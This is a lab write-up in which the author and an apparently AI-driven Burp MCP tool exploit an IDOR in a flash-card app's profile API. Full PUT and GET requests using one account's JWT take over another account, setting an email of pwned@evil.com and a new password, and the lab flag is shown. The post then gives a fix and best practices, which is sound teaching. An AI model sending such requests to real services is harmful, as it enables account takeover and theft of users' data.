---
title: Tanuki - IDOR
tags:
  - bugforge
  - idor
  - broken-access-control
  - burpsuite
  - mcp
  - account-takeover
---

- Very cool lab today!
- I started getting more comfortable recently in ways of testing, so now more often I will create two users just to make sure I test for multiple different things

## Enumeration
- Created `tester1` and `tester2`, then clicked around to understand the application

![Daily](/BugForge/img/tanuki-1.png)

- I had a good idea when I caught the `PUT` request on change inside of the profile

![Daily](/BugForge/img/tanuki-2.png)

- At this point, as I was leaving the house for work, I decided to get `Burp MCP` on the case while I got ready :)
- By the time I was done and ready to pack my laptop inside the backpack, it had response and finished the lab!

## MCP

```bash
burp - get_proxy_http_history (MCP)(count: 50, offset: 0)
  ⎿  ⚠ Large MCP response (~13.6k tokens), this can fill up context quickly
  ⎿ {
      "request": "GET /login HTTP/2\r\nHost: lab-1769504482433-atyv8a.labs-app.bugforge.io\r\nSec-Ch-Ua: \"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\"\r\nSec-Ch-Ua-Mobile: ?0\r\nSec-Ch-Ua-Platform: \"macOS\"\r\nAccept-Language: en-GB,en;q=0.9\r\nUp
    grade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp
    … +323 lines (ctrl+o to expand)



⏺ I can see a "Tanuki" SRS flash cards app with several interesting API endpoints. Let me walk through what I see and test the IDOR.
```

```bash
Observed Endpoints
  ┌─────────────────────────┬────────┬──────┬───────────────────────┐
  │        Endpoint         │ Method │ Auth │        Purpose        │
  ├─────────────────────────┼────────┼──────┼───────────────────────┤
  │ /api/register           │ POST   │ No   │ User registration     │
  ├─────────────────────────┼────────┼──────┼───────────────────────┤
  │ /api/decks              │ GET    │ JWT  │ List flash card decks │
  ├─────────────────────────┼────────┼──────┼───────────────────────┤
  │ /api/profile/{username} │ GET    │ JWT  │ View profile          │
  ├─────────────────────────┼────────┼──────┼───────────────────────┤
  │ /api/profile/{username} │ PUT    │ JWT  │ Update profile        │
  ├─────────────────────────┼────────┼──────┼───────────────────────┤
  │ /api/verify-token       │ GET    │ JWT  │ Verify JWT            │
  └─────────────────────────┴────────┴──────┴───────────────────────┘
  IDOR Pattern Detected

  The profile endpoints use username in the URL path - a classic IDOR pattern. The authorization may only verify the JWT is valid, not whether the authenticated user owns the profile.

  Users in the system:
  - tester1 (id: 4) - token: eyJhbG...IiAw
  - tester2 (id: 5) - token: eyJhbG...1dYk

  Let me test the write operation first - trying to change tester1's password using tester2's token:
```

- This is superb write up from our friendly MCP

```bash
burp - send_http2_request (MCP)(pseudoHeaders: {"method":"PUT","scheme":"https","authority":"lab-1769504482433-atyv8a.labs-app.bugforge.io","path":"/api/profile/tester1"}, headers: {"authorization":"Bearer                                09:05:27 [24/76]
                                 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJ0ZXN0ZXIyIiwiaWF0IjoxNzY5NTA0NTQyfQ.hnXaGRfsTfGQjOGoGiJ_94eWLo87dbBT7g9pwjF1dYk","content-type":"application/json","accept":"application/json"}, requestBody:
                                 "{\"email\":\"pwned@evil.com\",\"full_name\":\"HACKED\",\"password\":\"pwned123\"}", targetHostname: "lab-1769504482433-atyv8a.labs-app.bugforge.io", targetPort: 443, usesHttps: true)
  ⎿  HttpRequestResponse{httpRequest=PUT /api/profile/tester1 HTTP/2
     Host: lab-1769504482433-atyv8a.labs-app.bugforge.io
     Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJ0ZXN0ZXIyIiwiaWF0IjoxNzY5NTA0NTQyfQ.hnXaGRfsTfGQjOGoGiJ_94eWLo87dbBT7g9pwjF1dYk
     … +12 lines (ctrl+o to expand)

⏺ IDOR CONFIRMED - Account Takeover

  Vulnerability Summary

  Type: IDOR on PUT /api/profile/{username} - Full Account Takeover

  Flag

  bug{8ZWAtkGSjR55L57r7eOG4AmBasPNUaYW}
```

```bash
Let me also verify the read IDOR exists:

⏺ burp - send_http2_request (MCP)(pseudoHeaders: {"method":"GET","scheme":"https","authority":"lab-1769504482433-atyv8a.labs-app.bugforge.io","path":"/api/profile/tester1"}, headers: {"authorization":"Bearer
                                 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJ0ZXN0ZXIyIiwiaWF0IjoxNzY5NTA0NTQyfQ.hnXaGRfsTfGQjOGoGiJ_94eWLo87dbBT7g9pwjF1dYk","accept":"application/json"}, requestBody: "", targetHostname:
                                 "lab-1769504482433-atyv8a.labs-app.bugforge.io", targetPort: 443, usesHttps: true)
  ⎿  HttpRequestResponse{httpRequest=GET /api/profile/tester1 HTTP/2
     Host: lab-1769504482433-atyv8a.labs-app.bugforge.io
     Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJ0ZXN0ZXIyIiwiaWF0IjoxNzY5NTA0NTQyfQ.hnXaGRfsTfGQjOGoGiJ_94eWLo87dbBT7g9pwjF1dYk
     … +11 lines (ctrl+o to expand)

⏺ Both Read + Write IDOR Confirmed

  The GET also works - viewing tester1's profile as tester2 shows the modified data:
  - Email changed to: pwned@evil.com
  - Full name changed to: HACKED

   Both operations are vulnerable:
  ┌─────────────────────────────┬────────────┬────────────────────────────────────┐
  │          Operation          │ Vulnerable │               Impact               │
  ├─────────────────────────────┼────────────┼────────────────────────────────────┤
  │ GET /api/profile/{username} │ Yes        │ PII disclosure (email)             │
  ├─────────────────────────────┼────────────┼────────────────────────────────────┤
  │ PUT /api/profile/{username} │ Yes        │ Account takeover (password change) │
  └─────────────────────────────┴────────────┴────────────────────────────────────┘
```

## Security Takeaways

### Vulnerability

- Insecure Direct Object Reference (`IDOR`) - Broken Access Control
- The `/api/profile/{username}` endpoint accepts any username in the URL path and performs operations on that user's profile without verifying the authenticated user has authorization to access or modify it.

- Affected Endpoints
	- GET `/api/profile/{username}` - Read any user's PII
	- PUT` /api/profile/{username} `- Modify any user's profile including password

- Root Cause
	- The server extracts the username from the JWT for authentication but uses the username from the URL path for the database operation. 
	- No check exists to ensure these match.

### Impact

- Severity: `Critical`
	  - `Account Takeover`: Attacker can change any user's password and login as them
	  - `PII Disclosure`: Email addresses exposed for all users
	  - `Data Integrity`: Attacker can modify profile data (email, full_name) for any user
	  - `Privilege Escalation Potential`: If admin accounts exist, attacker could take over admin

- CVSS Estimate: 9.1 (Critical)
	- Attack Vector: `Network`
	- Attack Complexity: `Low`
	 - Privileges Required: `Low` (any registered user)
	- User Interaction: `None`

### Remediation

- Immediate Fix:
  ```javascript
   // Before database operation, verify ownership

  app.put('/api/profile/:username', authMiddleware, (req, res) => {
    if (req.params.username !== req.user.username) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    // proceed with update
  });
  ```

### Best Practices

  - Use the authenticated user's ID from the JWT, not from URL parameters
  - Implement object-level authorization checks on all endpoints
  - Avoid exposing usernames in URLs - use /api/profile/me pattern instead
  - Add audit logging for sensitive profile changes
  - Require current password verification before password changes
